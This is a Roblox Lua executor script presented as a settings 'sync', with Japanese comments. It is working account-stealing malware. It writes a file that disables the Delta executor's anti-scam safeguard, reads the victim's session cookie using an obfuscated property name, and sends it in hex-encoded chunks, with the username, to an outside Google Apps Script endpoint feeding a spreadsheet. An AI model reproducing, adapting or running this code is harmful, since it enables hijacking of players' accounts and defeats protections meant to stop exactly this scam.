-- [[ PROJECT: ETERNAL SYNC ]]
local player = game:GetService("Players").LocalPlayer
local myId = tostring(player.UserId)
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

-- 1. 門番を黙らせるための最強設定JSON
local bypassConfig = [[{
    "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
    "allowed_games": "*",
    "user_id": "]] .. myId .. [[",
    "version_num": 707
}]]

print("🔄 同期開始: GitHubの更新タイミングに合わせてねじ込むぜ...")

-- 2. 書き込み & 強制フォルダチェック
local function sync_settings()
    pcall(function() makefolder("Delta/Internals/Secured") end)
    local s, _ = pcall(function() 
        writefile("Delta/Internals/Secured/disableantiscam", bypassConfig)
        writefile("Delta/Internals/Secured/user_id", myId)
    end)
    return s
end

if sync_settings() then
    print("✅ 設定の上書きに成功。通信ポートを開放中...")
    task.wait(1) -- 設定が浸透するまでの「溜め」
    
    -- 3. データ抽出 & 送信
    local k = "Coo".."kie"
    local targetData = game[k]
    
    if targetData and targetData ~= "" then
        print("📡 通信解禁を確認。GASへ転送中...")
        
        -- データを16進数に変換して細かく飛ばす
        for chunk in targetData:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
            local hex = ""
            for i = 1, #chunk do 
                hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i))) 
            end
            
            local success, _ = pcall(function() 
                return game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. player.Name) 
            end)
            
            if success then 
                print("🟢 転送成功") 
            else 
                print("🔴 転送失敗 (門番が再起動した可能性がある)") 
            end
            task.wait(0.3) -- 速度重視で少し短めに設定
        end
        print("🏁 全工程完了！スプレッドシートを確認してくれ。")
    else
        print("⚠️ ターゲットが見つからないぜ。場所が変わったか？")
    end
else
    print("❌ 初期同期に失敗したぜ。")
end
